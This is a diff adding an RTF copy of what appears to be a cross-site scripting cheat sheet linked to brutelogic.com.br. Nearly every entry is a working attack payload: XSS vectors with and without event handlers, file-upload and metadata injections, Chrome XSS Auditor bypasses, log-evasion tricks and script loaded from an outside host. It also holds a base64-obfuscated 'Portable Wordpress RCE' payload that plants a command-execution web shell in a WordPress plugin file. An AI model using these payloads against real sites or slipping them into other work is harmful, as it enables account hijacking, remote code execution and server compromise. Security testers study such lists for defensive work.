+\cf2 */</script>'>alert(1)/*<script/1='\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clcbpat1 \clwWidth12586\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clmrg \clvertalt \clcbpat1 \clwWidth12586\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Multi Input\nestcell 
+\pard\intbl\itap2\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth5638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth6947\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Double Input\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Triple Input\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth5638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth6947\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 p=<svg/1='&q='onload=alert(1)>\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 p=<svg 1='&q='onload='/*&r=*/alert(1)'>\nestcell \lastrow\nestrow\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/xss-without-event-handlers"}}{\fldrslt \cf6 Without Event Handlers}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <script>alert(1)</script> \
+<script src=javascript:alert(1)> \
+<iframe src=javascript:alert(1)> \
+<embed src=javascript:alert(1)> \
+<a href=javascript:alert(1)>click \
+<math><brute href=javascript:alert(1)>click \
+<form action=javascript:alert(1)><input type=submit> \
+<isindex action=javascript:alert(1) type=submit value=click> \
+<form><button formaction=javascript:alert(1)>click \
+<form><input formaction=javascript:alert(1) type=submit value=click> \
+<form><input formaction=javascript:alert(1) type=image value=click> \
+<form><input formaction=javascript:alert(1) type=image src=SOURCE> \
+<isindex formaction=javascript:alert(1) type=submit value=click> \
+<object data=javascript:alert(1)> \
+<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> \
+<svg><script xlink:href=data:,alert(1) /> \
+<math><brute xlink:href=javascript:alert(1)>click \
+<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/xss-in-mobile-devices"}}{\fldrslt \cf6 Mobile Only}}\cell 
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrt\brdrnil \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clcbpat1 \clwWidth12585\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clmrg \clvertalt \clcbpat1 \clwWidth12585\clftsWidth3 \clbrdrt\brdrnil \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Event Handlers\nestcell 
+\pard\intbl\itap2\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clcbpat1 \clwWidth12585\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clmrg \clvertalt \clcbpat1 \clwWidth12585\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <html ontouchstart=alert(1)> \
+<html ontouchend=alert(1)> \
+<html ontouchmove=alert(1)> \
+<html ontouchcancel=alert(1)>\
+<body onorientationchange=alert(1)>\nestcell 
+\pard\intbl\itap2\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clmgf \clvertalt \clcbpat1 \clwWidth12585\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clmrg \clvertalt \clcbpat1 \clwWidth12585\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Javascript\nestcell 
+\pard\intbl\itap2\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth6907\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth5678\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Properties\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 Functions\nestcell \nestrow
+
+\itap2\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth6907\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth5678\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <svg onload=alert(navigator.connection.type)> \
+<svg onload=alert(navigator.battery.level)> \
+<svg onload=alert(navigator.battery.dischargingTime)> \
+<svg onload=alert(navigator.battery.charging)>\nestcell 
+\pard\intbl\itap2\pardeftab720\partightenfactor0
+\cf2 <svg onload=navigator.vibrate(500)> \
+<svg onload=navigator.vibrate([500,300,100])>\nestcell \lastrow\nestrow\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/leveraging-self-xss"}}{\fldrslt \cf6 Generic Self to Regular XSS}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <iframe src=LOGOUT_URL onload=forms[0].submit()> \
+</iframe><form method=post action=LOGIN_URL> \
+<input name=USERNAME_PARAMETER_NAME value=USERNAME> \
+<input name=PASSWORD_PARAMETER_NAME value=PASSWORD>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/file-upload-xss"}}{\fldrslt \cf6 File Upload}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 Injection in Filename\
+"><img src=1 onerror=alert(1)>.gif\
+\
+Injection in Metadata\
+$ exiftool -Artist='"><img src=1 onerror=alert(1)>' FILENAME.jpeg\
+\
+Injection with SVG File\
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>\
+\
+Injection with GIF File as Source of Script (CSP Bypass)\
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/chrome-xss-bypass"}}{\fldrslt \cf6 Google Chrome \
+Auditor Bypass}} \
+(up to v51)\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <script src="data:&comma;alert(1)// \
+"><script src=data:&comma;alert(1)// \
+\
+<script src="//brutelogic.com.br&sol;1.js&num; \
+"><script src=//brutelogic.com.br&sol;1.js&num; \
+\
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; \
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/cors-enabled-xss"}}{\fldrslt \cf6 PHP File for \
+XHR Remote Call}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <?php header(\'93Access-Control-Allow-Origin: *\'94); ?>\
+<img src=1 onerror=alert(1)>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/avoiding-xss-detection"}}{\fldrslt \cf6 Server Log Avoidance}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <svg onload=eval(URL.slice(-8))>#alert(1)\
+<svg onload=eval(location.hash.slice(1)>#alert(1)\
+<svg onload=innerHTML=location.hash>#<script>alert(1)</script>\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat1 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat1 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "http://brutelogic.com.br/blog/shortest-xss-possible"}}{\fldrslt \cf6 Shortest PoC}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <base href=//0>\
+\
+$ while:; do echo "alert(1)" | nc -lp80; done\cell \row
+
+\itap1\trowd \taflags1 \trgaph108\trleft-108 \trbrdrl\brdrnil \trbrdrt\brdrnil \trbrdrr\brdrnil 
+\clvertalt \clcbpat5 \clwWidth2638\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx4320
+\clvertalt \clcbpat5 \clwWidth12905\clftsWidth3 \clbrdrt\brdrs\brdrw20\brdrcf4 \clbrdrl\brdrnil \clbrdrb\brdrnil \clbrdrr\brdrnil \clpadt160 \clpadl160 \clpadb160 \clpadr160 \gaph\cellx8640
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 \
+\
+\
+\
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+{\field{\*\fldinst{HYPERLINK "https://twitter.com/brutelogic/status/752111662254227456"}}{\fldrslt \cf6 Portable Wordpress RCE}}\cell 
+\pard\intbl\itap1\pardeftab720\partightenfactor0
+\cf2 <script/src="data:&comma;eval(atob(location.hash.slice(1)))//&num;\
+#eD1uZXcgWE1MSHR0cFJlcXVlc3QoKQ0KcD0nL3dwLWFkbWluL3Bsd\
+Wdpbi1lZGl0b3IucGhwPycNCmY9J2ZpbGU9YWtpc21ldC9pbmRleC5w\
+aHAnDQp4Lm9wZW4oJ0dFVCcscCtmLDApDQp4LnNlbmQoKQ0KJD0n\
+X3dwbm9uY2U9JysvY2UiIHZhbHVlPSIoW14iXSo/KSIvLmV4ZWMoeC\
+5yZXNwb25zZVRleHQpWzFdKycmbmV3Y29udGVudD08Pz1gJF9HRV\
+RbYnJ1dGVdYDsmYWN0aW9uPXVwZGF0ZSYnK2YNCngub3BlbignUE\
+9TVCcscCtmLDEpDQp4LnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHl\
+wZScsJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpD\
+Qp4LnNlbmQoJCk=\
+\
+http://DOMAIN/WP-ROOT/wp-content/plugins/akismet/index.php?brute=CMD\cell \lastrow\row
+\pard\pardeftab720\partightenfactor0
+
+\b\fs40 \cf2 URLs                   & => %26 , # => %23 , + => %2B}
